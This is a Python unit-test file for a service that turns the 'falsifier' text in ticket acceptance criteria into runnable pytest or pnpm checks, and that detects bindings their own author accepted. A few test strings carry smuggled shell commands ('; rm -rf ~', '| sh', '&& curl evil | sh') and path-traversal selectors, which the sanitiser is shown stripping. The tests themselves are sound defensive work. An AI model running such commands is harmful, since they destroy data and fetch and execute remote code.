# SPDX-FileCopyrightText: 2026 OmniNode.ai Inc.
# SPDX-License-Identifier: MIT
"""OMN-20153 AC1 -- an author's accepted falsifier becomes a runnable check.

Today only 1 of 41 tickets carries a check written from its own acceptance
criteria (quality-evidence audit, 2026-09-30). The falsifiers are already in
the contract, transcribed by occ-autobind from the ticket's creation revision.
This module pins the pure derivation that turns each one into a dod_evidence
item, and the honest refusal for a falsifier a machine cannot run.

The contracts used below are copies of the shape of the real OCC contracts
minted today (OMN-20110, OMN-19790, OMN-20028), reduced to the fields the
derivation reads.
"""

from __future__ import annotations

from typing import Any

import pytest

from omnimarket.nodes.node_dod_verify.services.ac_falsifier_checks import (
    actor_identities,
    derive_falsifier_items,
    is_accepted_binding,
    parse_falsifier_command,
    self_accepted_bindings,
    self_accepting_actor,
)

pytestmark = pytest.mark.unit


def _contract(
    criteria: dict[str, str],
    *,
    accepted: tuple[str, ...] | None = None,
    proposed_by: str = "occ-autobind",
    accepted_by: str = "author-uuid",
) -> dict[str, Any]:
    """A contract in the shape occ-autobind mints: requirements + ac_bindings."""
    labels = tuple(criteria) if accepted is None else accepted
    return {
        "ticket_id": "OMN-20999",
        "requirements": [
            {
                "id": "req-transcribed-acceptance-criteria",
                "statement": "transcribed",
                "acceptance": [
                    {"id": label, "statement": f"{label}: {text}"}
                    for label, text in criteria.items()
                ],
            }
        ],
        "dod_evidence": [
            {
                "id": "dod-OmniNode-ai-omnimarket-pr-3103",
                "checks": [{"check_type": "command", "check_value": "true"}],
                "binds_ac": list(labels),
                "ac_bindings": [
                    {
                        "label": label,
                        "criterion_hash": "a" * 64,
                        "proposed_by": proposed_by,
                        "accepted_by": accepted_by,
                        "accepted_at": "2026-09-30T01:00:00Z",
                    }
                    for label in labels
                ],
            }
        ],
    }


def _derive(
    contract: dict[str, Any],
    *,
    repos: tuple[str, ...] = ("omnimarket",),
    exists: bool = True,
    runner: str | None = "uv run pytest",
):
    return derive_falsifier_items(
        contract,
        list(contract["dod_evidence"]),
        repo_candidates=repos,
        path_exists=lambda _repo, _path: exists,
        declared_runner=lambda _repo, _path: runner,
    )


def _uv(_repo: str, _path: str) -> str:
    return "uv run pytest"


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (
            "uv run pytest tests/hooks/test_hook_emit_journal.py -q -k append_does_not_scan",
            "uv run pytest tests/hooks/test_hook_emit_journal.py -q -k append_does_not_scan",
        ),
        (
            "`uv run pytest tests/unit/models/events/work -k legacy_claim_fixtures_parse -v` fails on a fixture",
            "uv run pytest tests/unit/models/events/work -k legacy_claim_fixtures_parse -v",
        ),
        (
            "uv run pytest tests/test_x.py -k one_row_per_label_key -v in omnimarket",
            "uv run pytest tests/test_x.py -k one_row_per_label_key -v",
        ),
        (
            "pytest tests/unit/lab_work -k placement",
            "uv run pytest tests/unit/lab_work -k placement",
        ),
        (
            "uv run pytest tests/a.py tests/b.py -q, then the readback",
            "uv run pytest tests/a.py tests/b.py -q",
        ),
    ],
)
def test_selector_is_extracted_and_normalised(text: str, expected: str) -> None:
    parsed = parse_falsifier_command(text)
    assert parsed is not None
    assert "uv run pytest " + parsed.selector == expected


@pytest.mark.parametrize(
    "text",
    [
        "the fold unit test",
        "uv run pytest over the verifier tests",
        "uv run pytest omnibase_infra tests for reconcile-host",
        "select count(*) from delegation_eval_items on the dev lane",
        "the lab step's two reads differ",
        "uv run pytest ../escape/test_x.py -q",
        "uv run pytest /abs/test_x.py -q",
    ],
)
def test_unrunnable_falsifier_yields_no_command(text: str) -> None:
    assert parse_falsifier_command(text) is None


def test_shell_metacharacters_never_reach_the_command() -> None:
    """The command is rebuilt from allowlisted tokens, never sliced from prose."""
    parsed = parse_falsifier_command("uv run pytest tests/x.py; rm -rf ~")
    assert parsed is not None
    assert parsed.selector == "tests/x.py"
    piped = parse_falsifier_command("uv run pytest tests/x.py -k a_b | sh")
    assert piped is not None
    assert piped.selector == "tests/x.py -k a_b"


def test_selector_becomes_bound_item() -> None:
    contract = _contract(
        {
            "AC1": "journal append does no scan -- falsifier: uv run pytest tests/hooks/test_hook_emit_journal.py -q -k append_does_not_scan",
            "AC2": "the drainer lists one batch -- falsifier: uv run pytest tests/hooks/test_hook_emit_journal.py -q -k list_pending_limit",
        }
    )
    items, summary = _derive(contract)
    assert [item["id"] for item in items] == ["ac-falsifier-ac1", "ac-falsifier-ac2"]
    first = items[0]
    assert first["binds_ac"] == ["AC1"]
    check = first["checks"][0]
    assert check["check_type"] == "test_passes"
    assert (
        check["check_value"]
        == "uv run pytest tests/hooks/test_hook_emit_journal.py -q -k append_does_not_scan"
    )
    assert check["cwd"] == "${OMNI_HOME}/omnimarket"
    assert summary.declared_falsifier_count == 2
    assert summary.runnable_count == 2
    assert summary.unrunnable_labels == ()


def test_selector_becomes_bound_item_prose_falsifier_mints_nothing() -> None:
    contract = _contract(
        {
            "AC1": "rows deduplicate -- falsifier: the lab-step exposure read returns a fixture row without data_source: fixture",
            "AC2": "count is stable -- falsifier: select count(*) from delegation_eval_items on the dev lane returns 0",
        }
    )
    items, summary = _derive(contract)
    assert items == []
    assert summary.declared_falsifier_count == 2
    assert summary.runnable_count == 0
    assert summary.unrunnable_labels == ("AC1", "AC2")


def test_unaccepted_criterion_is_never_derived() -> None:
    """A draft binding is a proposal; only the author's acceptance is trusted."""
    contract = _contract(
        {
            "AC1": "a -- falsifier: uv run pytest tests/test_a.py -q",
            "AC2": "b -- falsifier: uv run pytest tests/test_b.py -q",
        },
        accepted=("AC1",),
    )
    items, summary = _derive(contract)
    assert [item["binds_ac"] for item in items] == [["AC1"]]
    assert summary.declared_falsifier_count == 1


def test_no_falsifier_marker_means_no_declaration() -> None:
    contract = _contract({"AC1": "uv run pytest tests/test_a.py -q"})
    items, summary = _derive(contract)
    assert items == []
    assert summary.declared_falsifier_count == 0


def test_contract_without_requirements_declares_nothing() -> None:
    contract = {"ticket_id": "OMN-1", "dod_evidence": [{"id": "x", "checks": []}]}
    items, summary = _derive(contract)
    assert items == []
    assert summary.declared_falsifier_count == 0
    assert summary.runnable_count == 0


def test_repo_is_the_one_whose_clone_holds_the_named_path() -> None:
    contract = _contract(
        {"AC1": "a -- falsifier: uv run pytest tests/test_a.py -q"},
    )
    items, _ = derive_falsifier_items(
        contract,
        list(contract["dod_evidence"]),
        repo_candidates=("omnibase_infra", "omniclaude"),
        path_exists=lambda repo, _path: repo == "omniclaude",
        declared_runner=_uv,
    )
    assert items[0]["checks"][0]["cwd"] == "${OMNI_HOME}/omniclaude"


def test_named_repo_hint_wins_when_it_holds_the_path() -> None:
    contract = _contract(
        {
            "AC1": "a -- falsifier: uv run pytest tests/test_a.py -q in omnibase_internal"
        },
    )
    items, _ = derive_falsifier_items(
        contract,
        list(contract["dod_evidence"]),
        repo_candidates=("omnimarket",),
        path_exists=lambda _repo, _path: True,
        declared_runner=_uv,
    )
    assert items[0]["checks"][0]["cwd"] == "${OMNI_HOME}/omnibase_internal"


def test_named_repo_the_verifier_cannot_reach_is_unrunnable_not_failed() -> None:
    """A hint at a clone outside $OMNI_HOME must not fake a red."""
    contract = _contract(
        {
            "AC1": "a -- falsifier: uv run pytest tests/test_a.py -q in omnibase_internal"
        },
    )
    items, summary = derive_falsifier_items(
        contract,
        list(contract["dod_evidence"]),
        repo_candidates=("omnimarket",),
        path_exists=lambda _repo, _path: False,
        declared_runner=_uv,
    )
    assert items == []
    assert summary.unrunnable_labels == ("AC1",)


def test_missing_path_still_mints_so_it_fails_visibly() -> None:
    """A falsifier naming a test that does not exist must FAIL, not vanish.

    OMN-19533: a falsifier that names a nonexistent path was never run by any
    receipt. Minting it against the first candidate makes pytest exit 4, and
    the item reads FAILED.
    """
    contract = _contract({"AC1": "a -- falsifier: uv run pytest tests/test_gone.py -q"})
    items, summary = _derive(contract, exists=False)
    assert len(items) == 1
    assert summary.runnable_count == 1


def test_no_candidate_repository_is_unrunnable_not_guessed() -> None:
    contract = _contract({"AC1": "a -- falsifier: uv run pytest tests/test_a.py -q"})
    items, summary = _derive(contract, repos=())
    assert items == []
    assert summary.unrunnable_labels == ("AC1",)


def test_self_accepted_binding_is_not_derived() -> None:
    """OMN-17427: the binding's author cannot accept its own proposal."""
    contract = _contract(
        {"AC1": "a -- falsifier: uv run pytest tests/test_a.py -q"},
        proposed_by="evid-B13-2a21",
        accepted_by="evid-B13-2a21",
    )
    items, summary = _derive(contract)
    assert items == []
    assert summary.declared_falsifier_count == 0
    assert summary.self_accepted_bindings == (
        "dod-OmniNode-ai-omnimarket-pr-3103:AC1 accepted_by=evid-B13-2a21",
    )


def test_self_acceptance_matches_across_host_suffix_and_lane_token() -> None:
    contract = _contract(
        {"AC1": "a -- falsifier: uv run pytest tests/test_a.py -q"},
        proposed_by="claude:opus5:subagent lane=mac-occ-contracts",
        accepted_by="mac-occ-contracts@mac",
    )
    items, summary = _derive(contract)
    assert items == []
    assert summary.self_accepted_bindings == (
        "dod-OmniNode-ai-omnimarket-pr-3103:AC1 accepted_by=mac-occ-contracts@mac",
    )


def test_binding_accepted_by_a_different_lane_is_admitted() -> None:
    contract = _contract(
        {"AC1": "a -- falsifier: uv run pytest tests/test_a.py -q"},
        proposed_by="evid-B13-2a21",
        accepted_by="verify-B13-2a21",
    )
    items, summary = _derive(contract)
    assert [item["binds_ac"] for item in items] == [["AC1"]]
    assert summary.declared_falsifier_count == 1
    assert summary.self_accepted_bindings == ()


def test_missing_acceptance_derives_nothing_and_is_reported() -> None:
    contract = _contract({"AC1": "a -- falsifier: uv run pytest tests/test_a.py -q"})
    record = contract["dod_evidence"][0]["ac_bindings"][0]
    del record["accepted_by"]
    del record["accepted_at"]
    items, summary = _derive(contract)
    assert items == []
    assert summary.declared_falsifier_count == 0
    # OMN-17427: no falsifier runs for it, and nobody accepted it either.
    assert summary.self_accepted_bindings == (
        "dod-OmniNode-ai-omnimarket-pr-3103:AC1 accepted_by=<none>",
    )


@pytest.mark.parametrize("label", ["AC1", " ac-1 ", "ac_1"])
def test_independent_acceptance_elsewhere_clears_the_self_accepted_label(
    label: str,
) -> None:
    contract = _contract(
        {"AC1": "a -- falsifier: uv run pytest tests/test_a.py -q"},
        proposed_by="evid-B13-2a21",
        accepted_by="evid-B13-2a21",
    )
    contract["dod_evidence"][0]["ac_bindings"][0]["label"] = label
    independent = _contract(
        {"AC1": "a -- falsifier: uv run pytest tests/test_a.py -q"},
        proposed_by="evid-B13-2a21",
        accepted_by="verify-B13-2a21",
    )["dod_evidence"][0]
    independent["id"] = "second-item"
    contract["dod_evidence"].append(independent)
    items, summary = _derive(contract)
    assert summary.self_accepted_bindings == ()
    assert [item["binds_ac"] for item in items] == [["AC1"]]


@pytest.mark.parametrize(
    ("actor", "expected"),
    [
        ("   ", frozenset()),
        (" User@Bridge@Host ", frozenset({"user@bridge@host", "user@bridge"})),
        (
            "Claude lane=Build-0923; lane=VERIFY-0923.)",
            frozenset(
                {
                    "claude lane=build-0923; lane=verify-0923.)",
                    "build-0923",
                    "verify-0923",
                }
            ),
        ),
    ],
)
def test_actor_identities_normalize_names_and_every_lane_token(
    actor: str, expected: frozenset[str]
) -> None:
    """OMN-17427: spelling and actor decorations cannot hide self-acceptance."""
    assert actor_identities(actor) == expected


@pytest.mark.parametrize("proposed_by", [None, "", "   "])
def test_acceptance_with_unknown_author_is_unchanged(proposed_by: str | None) -> None:
    record = {"accepted_by": "actor", "proposed_by": proposed_by}
    assert self_accepting_actor(record) is None
    assert is_accepted_binding(record)


def test_self_accepted_records_keep_contract_order_and_fallback_item_ids() -> None:
    items = [
        {
            "id": "first",
            "ac_bindings": [
                {"label": "AC2", "proposed_by": "Lane", "accepted_by": " lane "},
                {"label": "AC1", "proposed_by": "Lane", "accepted_by": "LANE@host"},
            ],
        },
        {
            "ac_bindings": [
                {"label": "AC2", "proposed_by": "lane", "accepted_by": "lane"}
            ]
        },
    ]
    assert self_accepted_bindings(items) == (
        "first:AC2 accepted_by=lane",
        "first:AC1 accepted_by=LANE@host",
        "dod_evidence[1]:AC2 accepted_by=lane",
    )


_OMN_19405_HASHES = {
    "AC1": "5ae9f09c6cc6b70b5486c94035dbe5c07848137d4b2e850f93c5b283f513e523",
    "AC2": "c8813e445fe88492e911795b4ce65ba29e5383e53a979b9dc9172dbd35b799ea",
}


def _binding(
    label: str, *, proposed_by: str, accepted_by: str | None, hash_: str | None = None
) -> dict[str, Any]:
    record: dict[str, Any] = {
        "label": label,
        "criterion_hash": hash_ or _OMN_19405_HASHES[label],
        "proposed_by": proposed_by,
    }
    if accepted_by is not None:
        record["accepted_by"] = accepted_by
        record["accepted_at"] = "2026-10-03T06:25:37Z"
    return record


def _omn_19405_items(*, second_lane: tuple[str, ...] = ()) -> list[dict[str, Any]]:
    """The binding shape of onex_change_control contracts/OMN-19405.yaml at dev.

    The original occ-autobind record on each label is accepted by a person's
    uuid; the authoring lane (evid-B13-2a21) then bound its own behavior proof
    to the same label and accepted it itself; a later lane appends one item per
    label that re-runs the same check and accepts the author's binding.
    """
    autobind_uuid = "7a850ce1-f95e-431f-b4e3-62f7449f04c0"
    items: list[dict[str, Any]] = [
        {
            "id": "dod-OmniNode-ai-omnibase_core-pr-1754",
            "ac_bindings": [
                _binding("AC1", proposed_by="occ-autobind", accepted_by=autobind_uuid),
                _binding("AC2", proposed_by="occ-autobind", accepted_by=autobind_uuid),
            ],
        },
        {
            "id": "dod-b13-19405-ac1-incident-replay-held-and-clear",
            "ac_bindings": [
                _binding(
                    "AC1", proposed_by="evid-B13-2a21", accepted_by="evid-B13-2a21"
                )
            ],
        },
        {
            "id": "dod-b13-19405-ac2-fold-equals-reference-exhaustive",
            "ac_bindings": [
                _binding(
                    "AC2", proposed_by="evid-B13-2a21", accepted_by="evid-B13-2a21"
                )
            ],
        },
    ]
    items.extend(
        {
            "id": f"dod-accept-b-19405-{label.lower()}",
            "ac_bindings": [
                _binding(
                    label, proposed_by="evid-B13-2a21", accepted_by="bind-accept-b-2a21"
                )
            ],
        }
        for label in second_lane
    )
    return items


def test_autobind_record_on_the_label_does_not_mask_a_self_accepted_binding() -> None:
    """OMN-17427: the original autobind acceptance is not the author's binding's."""
    assert self_accepted_bindings(_omn_19405_items()) == (
        "dod-b13-19405-ac1-incident-replay-held-and-clear:AC1 accepted_by=evid-B13-2a21",
        "dod-b13-19405-ac2-fold-equals-reference-exhaustive:AC2 accepted_by=evid-B13-2a21",
    )


def test_second_lane_acceptance_clears_only_the_binding_it_accepted() -> None:
    """Positive control: bind-accept-b re-accepts AC1's binding, not AC2's."""
    assert self_accepted_bindings(_omn_19405_items(second_lane=("AC1",))) == (
        "dod-b13-19405-ac2-fold-equals-reference-exhaustive:AC2 accepted_by=evid-B13-2a21",
    )
    assert self_accepted_bindings(_omn_19405_items(second_lane=("AC1", "AC2"))) == ()


def test_second_lane_acceptance_of_a_changed_criterion_does_not_clear() -> None:
    items = _omn_19405_items(second_lane=("AC1",))
    items[-1]["ac_bindings"][0]["criterion_hash"] = "f" * 64
    assert len(self_accepted_bindings(items)) == 2


def test_a_binding_with_no_acceptance_is_reported_beside_an_accepted_label() -> None:
    items = _omn_19405_items(second_lane=("AC1", "AC2"))
    items.append(
        {
            "id": "dod-draft",
            "ac_bindings": [
                _binding("AC1", proposed_by="batch-lane", accepted_by=None)
            ],
        }
    )
    assert self_accepted_bindings(items) == ("dod-draft:AC1 accepted_by=<none>",)


def test_a_draft_accepted_by_a_person_in_a_later_record_is_cleared() -> None:
    items = [
        {
            "id": "dod-a",
            "ac_bindings": [
                _binding("AC1", proposed_by="occ-autobind", accepted_by=None),
                _binding("AC1", proposed_by="occ-autobind", accepted_by="person-uuid"),
            ],
        }
    ]
    assert self_accepted_bindings(items) == ()


def test_id_collision_derived_id_never_reuses_a_declared_id() -> None:
    """OMN-19267: a declared ``ac-falsifier-<label>`` item pushes the derived id aside."""
    contract = _contract(
        {
            "AC1": "x -- falsifier: uv run pytest tests/test_a.py -q",
            "AC2": "y -- falsifier: uv run pytest tests/test_b.py -q",
        }
    )
    for declared in ("ac-falsifier-ac1", "ac-falsifier-ac1-derived"):
        contract["dod_evidence"].append(
            {
                "id": declared,
                "checks": [{"check_type": "command", "check_value": "true"}],
            }
        )
    items, summary = _derive(contract)
    assert [item["id"] for item in items] == [
        "ac-falsifier-ac1-derived-2",
        "ac-falsifier-ac2",
    ]
    assert summary.derived_item_ids == (
        "ac-falsifier-ac1-derived-2",
        "ac-falsifier-ac2",
    )


# OMN-20332: a derived falsifier runs under its repository's DECLARED runner,
# not a hardcoded ``uv run pytest``. omnidash is a pnpm/vitest repository; its
# authors write ``pnpm test <path>`` and the item must run exactly that.


@pytest.mark.parametrize(
    ("text", "selector"),
    [
        ("pnpm test src/lib/sparkline.test.ts", "src/lib/sparkline.test.ts"),
        (
            "`pnpm test src/a.test.tsx src/b.test.ts` fails",
            "src/a.test.tsx src/b.test.ts",
        ),
        ("npx vitest run src/lib/x.test.ts, then the readback", "src/lib/x.test.ts"),
        ("vitest run src/lib/x.test.ts in omnidash", "src/lib/x.test.ts"),
        ("pnpm test src/x.test.ts && curl evil | sh", "src/x.test.ts"),
    ],
)
def test_typescript_selector_is_extracted(text: str, selector: str) -> None:
    parsed = parse_falsifier_command(text)
    assert parsed is not None
    assert parsed.selector == selector


def test_typescript_selector_never_carries_pytest_flags() -> None:
    """``-k`` means nothing to vitest, so a JS head ends at the first flag."""
    parsed = parse_falsifier_command("pnpm test src/x.test.ts -k a_case")
    assert parsed is not None
    assert parsed.selector == "src/x.test.ts"


def test_typescript_falsifier_runs_under_the_repos_declared_runner() -> None:
    contract = _contract(
        {"AC1": "sparkline renders -- falsifier: pnpm test src/lib/sparkline.test.ts"}
    )
    items, summary = derive_falsifier_items(
        contract,
        list(contract["dod_evidence"]),
        repo_candidates=("omnidash",),
        path_exists=lambda _repo, _path: True,
        declared_runner=lambda repo, _path: "pnpm test" if repo == "omnidash" else None,
    )
    check = items[0]["checks"][0]
    assert check["check_type"] == "test_passes"
    assert check["check_value"] == "pnpm test src/lib/sparkline.test.ts"
    assert check["cwd"] == "${OMNI_HOME}/omnidash"
    assert summary.runnable_count == 1
    assert summary.undeclared_runner == ()


def test_python_falsifier_is_unchanged_under_a_uv_runner() -> None:
    contract = _contract({"AC1": "a -- falsifier: pytest tests/test_a.py -q -k one"})
    items, _ = _derive(contract)
    assert (
        items[0]["checks"][0]["check_value"]
        == "uv run pytest tests/test_a.py -q -k one"
    )


def test_repository_with_no_declared_runner_fails_loud_not_silently() -> None:
    """No runner declaration: no guessed command, and the gap is named per repo."""
    contract = _contract(
        {"AC1": "sparkline renders -- falsifier: pnpm test src/lib/sparkline.test.ts"}
    )
    items, summary = _derive(contract, repos=("omnidash",), runner=None)
    assert items == []
    assert summary.declared_falsifier_count == 1
    assert summary.runnable_count == 0
    assert summary.undeclared_runner == (("AC1", "omnidash"),)
    assert summary.unrunnable_labels == ()


def test_js_mention_in_prose_never_hides_a_later_pytest_command() -> None:
    parsed = parse_falsifier_command(
        "`pnpm test` is unavailable; use `uv run pytest tests/test_a.py -q`"
    )
    assert parsed is not None
    assert parsed.selector == "tests/test_a.py -q"


def test_runner_is_asked_for_the_falsifiers_first_path() -> None:
    """The bare Python form depends on the path, so the path reaches the runner."""
    seen: list[tuple[str, str]] = []

    def _record(repo: str, path: str) -> str:
        seen.append((repo, path))
        return "uv run pytest"

    contract = _contract({"AC1": "a -- falsifier: pytest tests/ci/test_a.py -q"})
    derive_falsifier_items(
        contract,
        list(contract["dod_evidence"]),
        repo_candidates=("omnidash",),
        path_exists=lambda _repo, _path: True,
        declared_runner=_record,
    )
    assert seen == [("omnidash", "tests/ci/test_a.py")]
